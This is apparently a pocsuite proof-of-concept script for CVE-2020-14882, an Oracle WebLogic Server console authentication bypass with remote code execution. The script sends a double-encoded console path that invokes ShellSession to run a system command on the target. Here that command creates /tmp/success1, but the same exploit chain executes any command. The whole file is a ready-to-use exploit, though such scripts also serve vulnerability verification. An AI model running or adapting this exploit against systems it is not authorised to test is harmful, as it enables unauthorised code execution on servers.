#!/usr/bin/env python
# coding: utf-8

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url

class TestPOC(POCBase):
	vulID = '''CVE-2020-14882'''
	cveID = '''CVE-2020-14882'''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = '''郝志成'''
	vulDate = '''2020-03-30'''
	createDate = '''2020-03-30'''
	updateDate = '''2020-03-30'''
	name = '''Oracle WebLogic Server 远程代码执行漏洞'''
	desc = '''
CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，
'''
	solution = '''安装官方最新补丁进行升级'''
	severity = ''''''
	vulType = ''''''
	taskType = ''''''
	references = ['''https://mp.weixin.qq.com/s/34MWLMkMGKPuXtZnIuP_yg''']
	appName = '''Oracle WebLogic Server'''
	appVersion = '''10.3.6., 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0'''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']

	def _attack(self):
		return self._verify()

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target, 7001)
		result = {}
		headers = {

	         "Content-Type": "application/x-www-form-urlencoded",
		}
		path='/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(\'touch%20/tmp/success1\');")'
		vul_url = make_verify_url(self.url,path,mod=0)
		resp = req.get(url=vul_url, headers = headers, verify = False, allow_redirects = False, timeout = 10)
		
		if  resp.status_code == 200 :
			result['VerifyInfo'] = http_packet(resp)
			result['VerifyInfo']['URL'] = vul_url
			result['VerifyInfo']['port'] = port
			#在示例中，会在后台产生一个名为success1的文件
		return self.parse_output(result)

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output

register(TestPOC)